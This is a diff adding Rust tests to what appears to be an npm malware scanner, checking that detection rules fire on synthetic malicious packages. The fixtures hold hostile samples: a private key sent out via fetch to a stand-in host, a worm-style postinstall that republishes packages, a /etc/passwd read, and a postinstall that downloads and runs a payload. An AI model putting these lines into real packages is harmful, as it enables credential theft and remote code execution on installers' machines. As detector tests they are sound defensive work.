@@ -804,3 +804,80 @@ fn large_base64_without_eval_is_clean() {
         s.findings
     );
 }
+
+#[test]
+fn secret_material_literal_in_source_fires_npm033() {
+    let pkg = r#"{ "name": "wallet-stealer", "version": "1.0.0" }"#;
+    let src = r#"
+const MNEMONIC = process.env.MNEMONIC;
+const PRIVATE_KEY = "0xabcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789";
+fetch("http://x/" + PRIVATE_KEY);
+"#;
+    let bytes = build_tgz(&[
+        ("package/package.json", pkg.as_bytes()),
+        ("package/index.js", src.as_bytes()),
+    ]);
+    let s = analyze(bytes);
+    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
+    assert!(ids.contains(&"NPM033"), "got {ids:?}");
+    assert!(s
+        .capabilities
+        .contains(&monomi_core::Capability::SecretMaterial));
+}
+
+#[test]
+fn npm_publish_in_postinstall_fires_npm034_critical() {
+    // Shai-Hulud worm shape: postinstall re-publishes the
+    // installing user's other packages.
+    let pkg = r#"{
+        "name": "worm",
+        "version": "1.0.0",
+        "scripts": { "postinstall": "node steal.js && npm publish ./other-pkg" }
+    }"#;
+    let bytes = build_tgz(&[("package/package.json", pkg.as_bytes())]);
+    let s = analyze(bytes);
+    let n34: Vec<_> = s.findings.iter().filter(|f| f.rule_id == "NPM034").collect();
+    assert_eq!(n34.len(), 1, "expected NPM034 fire, got {:?}", s.findings);
+    assert_eq!(n34[0].severity, monomi_core::Severity::Critical);
+    assert!(!n34[0].defers_to_stage2);
+    assert_eq!(s.verdict, Stage1Verdict::Malicious);
+}
+
+#[test]
+fn privesc_path_literal_fires_npm035() {
+    let pkg = r#"{ "name": "recon", "version": "1.0.0" }"#;
+    let src = r#"const passwd = require('fs').readFileSync('/etc/passwd', 'utf8');"#;
+    let bytes = build_tgz(&[
+        ("package/package.json", pkg.as_bytes()),
+        ("package/index.js", src.as_bytes()),
+    ]);
+    let s = analyze(bytes);
+    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
+    assert!(ids.contains(&"NPM035"), "got {ids:?}");
+}
+
+#[test]
+fn chmod_to_executable_in_postinstall_fires_npm036() {
+    let pkg = r#"{
+        "name": "dropper",
+        "version": "1.0.0",
+        "scripts": {
+            "postinstall": "curl -o ./helper https://x/pl && chmod +x ./helper && ./helper"
+        }
+    }"#;
+    let bytes = build_tgz(&[("package/package.json", pkg.as_bytes())]);
+    let s = analyze(bytes);
+    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
+    assert!(ids.contains(&"NPM036"), "got {ids:?}");
+}
+
+#[test]
+fn registry_write_introduction_is_decisive_via_capability() {
+    // Capability surface assertion: M8 NPM030 should treat
+    // RegistryWrite as decisive-on-introduction. Test through the
+    // capability enum directly (the diff pass is exercised by
+    // pipeline tests).
+    use monomi_core::Capability;
+    assert!(Capability::RegistryWrite.is_decisive_on_introduction());
+    assert!(Capability::SecretMaterial.is_decisive_on_introduction());
+}
